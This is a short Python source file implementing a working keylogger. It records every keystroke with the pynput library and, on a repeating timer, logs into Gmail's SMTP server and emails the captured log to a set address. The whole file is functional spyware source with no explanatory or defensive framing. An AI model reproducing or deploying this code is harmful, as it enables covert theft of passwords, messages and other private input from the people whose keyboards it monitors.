#!usr/bin/env python
import pynput.keyboard, threading, smtplib


class Keylogger:
    def __init__(self, time_interval, email, password):
        print("inside Constructor")
        self.log = "Keylogger started"
        self.email = email
        self.password = password
        self.interval=time_interval

    def process_key_press(self, key):
        current_key = ""
        try:
            current_key = current_key + str(key.char)
        except AttributeError:
            current_key = current_key + " " + str(key) + " "
        self.log = self.log + current_key

    def report(self):
        self.send_mail(self.email, self.password, self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def start(self):
        key_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with key_listener:
            self.report()
            key_listener.join()
